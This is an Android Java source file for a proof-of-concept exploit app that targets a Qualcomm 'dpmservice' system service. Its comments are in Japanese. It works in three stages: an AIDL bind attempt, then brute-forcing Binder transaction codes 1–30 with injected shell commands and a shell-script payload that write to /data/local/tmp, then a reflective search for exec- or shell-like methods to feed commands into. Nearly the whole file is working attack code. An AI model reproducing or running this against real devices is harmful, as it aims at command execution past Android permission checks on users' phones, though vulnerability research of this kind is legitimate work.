package com.example.dpmpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.qti.dpm.IDpmService; // AIDL自動生成クラス

import java.lang.reflect.Method;

public class MainActivity extends Activity {

    private static final String TAG = "DpmPoc";
    private static final String TARGET_SERVICE = "dpmservice";
    private TextView tvResult;
    private Button btnExploit;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvResult = findViewById(R.id.tvResult);
        btnExploit = findViewById(R.id.btnExploit);

        btnExploit.setOnClickListener(v -> new Thread(this::executeFullExploit).start());
    }

    // ================================================================
    // 多層攻撃エントリポイント
    // ================================================================
    private void executeFullExploit() {
        showResult("=== DPM Service Exploit Multi-Stage Start ===");

        // 第1層: AIDLスタブによる正規バインド＆既知メソッド呼び出し（権限チェックを確認）
        if (tryAidlBindAndCall()) {
            showResult("✅ 第1層成功: AIDLスタブで既知メソッドが実行できました（予想外ですが成功）");
            return;
        }

        // 第2層: 生Binderトランザクション総当たり（コード1～30、ペイロード多様化）
        if (bruteForceBinderTransactions()) {
            showResult("✅ 第2層成功: 生Binder経由で実行可能なメソッドを発見しペイロード送信");
            return;
        }

        // 第3層: リフレクションでDpmService内部の全メソッドを列挙し、exec系を探す
        if (reflectAndInvokeInternalMethods()) {
            showResult("✅ 第3層成功: リフレクションで内部メソッドを発見＆実行");
            return;
        }

        showResult("❌ 全ての層で実行可能なメソッドを発見できませんでした。サービス実装にシェル実行系が無いか、厳格なBinder権限がかかっています。");
    }

    // ================================================================
    // 第1層: AIDLスタブ正規バインド
    // ================================================================
    private boolean tryAidlBindAndCall() {
        try {
            // ServiceManager から IBinder 取得（リフレクション）
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, TARGET_SERVICE);
            if (binder == null) {
                showResult("  [層1] ServiceManager に " + TARGET_SERVICE + " が見つかりません");
                return false;
            }

            // AIDLスタブに変換
            IDpmService dpm = IDpmService.Stub.asInterface(binder);
            if (dpm == null) {
                showResult("  [層1] AIDLスタブ変換失敗");
                return false;
            }

            showResult("  [層1] AIDLバインド成功。getTCMFeatureEnabled() を呼び出し試行...");

            // 既知のメソッドを呼び出す（権限チェックに引っかかるはず）
            int result = dpm.getTCMFeatureEnabled();
            showResult("  [層1] 予期せぬ成功: getTCMFeatureEnabled() = " + result + " (権限ガードが無効?)");
            // もしここに来たら、このアプリ自体がシステム権限を持っている証拠。とりあえず成功扱い。
            return true;

        } catch (SecurityException se) {
            showResult("  [層1] SecurityException 捕捉（想定内）: " + se.getMessage());
            return false; // 権限がないので次へ
        } catch (RemoteException re) {
            showResult("  [層1] RemoteException: " + re.getMessage());
            return false;
        } catch (Exception e) {
            showResult("  [層1] その他例外: " + e.toString());
            return false;
        }
    }

    // ================================================================
    // 第2層: 生Binderトランザクション総当たり (コード + ペイロード多様化)
    // ================================================================
    private boolean bruteForceBinderTransactions() {
        IBinder binder = getRawBinder();
        if (binder == null) {
            showResult("  [層2] 生Binder取得失敗");
            return false;
        }

        // ペイロードパターン（6種類のシグネチャを模倣）
        // pattern0: String 1つ, pattern1: String 2つ, pattern2: String + int,
        // pattern3: int 1つ, pattern4: int 4つ, pattern5: byte[]
        String cmd1 = "id > /data/local/tmp/dpm_poc.txt 2>&1";
        String cmd2 = "echo pwned >> /data/local/tmp/dpm_poc.txt";
        byte[] script = "#!/system/bin/sh\nid > /data/local/tmp/dpm_script.txt\n".getBytes();

        for (int code = 1; code <= 30; code++) {
            // パターン0: String単体
            if (tryTransaction(binder, code, new Object[]{cmd1})) {
                showResult("  [層2] コード " + code + " (String単体) が応答OK");
                // 念のため2回目でコマンドを送り込む
                tryTransaction(binder, code, new Object[]{cmd2});
                return true;
            }
            // パターン1: String二つ
            if (tryTransaction(binder, code, new Object[]{"dummy", cmd1})) {
                showResult("  [層2] コード " + code + " (String二つ) が応答OK");
                tryTransaction(binder, code, new Object[]{"dummy", cmd2});
                return true;
            }
            // パターン2: String + int
            if (tryTransaction(binder, code, new Object[]{"/data/local/tmp/dummy.sh", 0755})) {
                showResult("  [層2] コード " + code + " (String+int) が応答OK");
                return true;
            }
            // パターン3: int単体 (setTCMFeature を想定)
            if (tryTransaction(binder, code, new Object[]{2})) {
                showResult("  [層2] コード " + code + " (int単体) が応答OK");
                return true;
            }
            // パターン4: int×4 (updateFdConfigParams を想定)
            if (tryTransaction(binder, code, new Object[]{100, 200, 300, 400})) {
                showResult("  [層2] コード " + code + " (int×4) が応答OK");
                return true;
            }
            // パターン5: byte[] (writeFile想定)
            if (tryTransaction(binder, code, new Object[]{script})) {
                showResult("  [層2] コード " + code + " (byte[]) が応答OK");
                return true;
            }
        }
        showResult("  [層2] 総当たり完了 (コード1〜30、全パターン) -> 応答なし");
        return false;
    }

    // 生トランザクション実行ヘルパー（リターンコードで判定）
    private boolean tryTransaction(IBinder binder, int code, Object[] args) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken("com.qti.dpm.IDpmService");
            // 引数の型に応じて書き込み
            for (Object arg : args) {
                if (arg instanceof String) {
                    data.writeString((String) arg);
                } else if (arg instanceof Integer) {
                    data.writeInt((Integer) arg);
                } else if (arg instanceof byte[]) {
                    data.writeByteArray((byte[]) arg);
                }
            }
            boolean ret = binder.transact(code, data, reply, 0);
            // 例外が飛ばなければ成功（SecurityExceptionはRemoteExceptionにラップされることがある）
            reply.readException(); // ここで例外が飛ぶとcatchへ
            // ここまで来たら例外なし = 受理された可能性大
            return ret;
        } catch (Exception e) {
            // セキュリティ拒否やメソッド未実装は無視
            Log.v(TAG, "トランザクション " + code + " 失敗: " + e.getMessage());
            return false;
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    // ================================================================
    // 第3層: リフレクションで内部メソッドを全探索 (exec系を発掘)
    // ================================================================
    private boolean reflectAndInvokeInternalMethods() {
        try {
            IBinder binder = getRawBinder();
            if (binder == null) return false;

            // 実際のサービス実装クラス（com.qti.dpm.DpmService）をロード試行
            // DpmApi は /system/framework/com.qti.dpmframework.jar からロードするが、
            // ここではシステムクラスローダーから直接探す（フォールバック）
            Class<?> dpmClass;
            try {
                dpmClass = Class.forName("com.qti.dpm.DpmService");
            } catch (ClassNotFoundException e) {
                // フレームワークJARからロードを試みる
                dalvik.system.PathClassLoader loader = new dalvik.system.PathClassLoader(
                        "/system/framework/com.qti.dpmframework.jar",
                        ClassLoader.getSystemClassLoader());
                dpmClass = loader.loadClass("com.qti.dpm.DpmService");
            }

            if (dpmClass == null) {
                showResult("  [層3] DpmService クラスが見つかりません");
                return false;
            }

            // 全メソッドを取得
            Method[] methods = dpmClass.getDeclaredMethods();
            showResult("  [層3] " + methods.length + " 個のメソッドを発見。exec/shell/run を含むものを探索...");

            for (Method m : methods) {
                String name = m.getName().toLowerCase();
                if (name.contains("exec") || name.contains("shell") || name.contains("run") || name.contains("command") || name.contains("system")) {
                    showResult("  [層3] 候補メソッド発見: " + m.getName() + " (引数型: " + m.getParameterTypes().length + "個)");

                    // 引数が1個でString型なら、シェルコマンドを突っ込んでみる
                    if (m.getParameterTypes().length == 1 && m.getParameterTypes()[0] == String.class) {
                        m.setAccessible(true);
                        try {
                            // サービスインスタンスを取得（binderをラップしたスタブ経由ではなく、実体が必要）
                            // ここでは無理なので、binderを引数に取るstaticメソッドか、asInterfaceで取得したオブジェクトを使う
                            // 代わりに、AIDLスタブオブジェクトを経由せずに直接ServiceManagerから取得したBinderを
                            // 動的プロキシでラップするか、ここでは断念してレポートだけに留める
                            showResult("  [層3] メソッド " + m.getName() + " は String引数を持つため、実行を試みましたが実体へのアクセスが不可。Binder越えでは呼べません。");
                            // 本当に呼ぶには DpmService のインスタンスが必要（システム側にある）ため、層2の生トランザクションが現実的。
                        } catch (Exception ex) {
                            Log.w(TAG, "リフレクション実行失敗", ex);
                        }
                    }
                }
            }
            showResult("  [層3] リフレクション探索完了。ただしインスタンス不在のため実行は層2に依存。");
            return false; // 実際の実行には至らないが、情報収集としては有効

        } catch (Exception e) {
            showResult("  [層3] リフレクション例外: " + e.toString());
            return false;
        }
    }

    // ================================================================
    // ユーティリティ: 生IBinder取得
    // ================================================================
    private IBinder getRawBinder() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, TARGET_SERVICE);
        } catch (Exception e) {
            return null;
        }
    }

    // ================================================================
    // UI表示
    // ================================================================
    private void showResult(final String msg) {
        runOnUiThread(() -> {
            tvResult.append(msg + "\n");
            Log.d(TAG, msg);
        });
    }
}
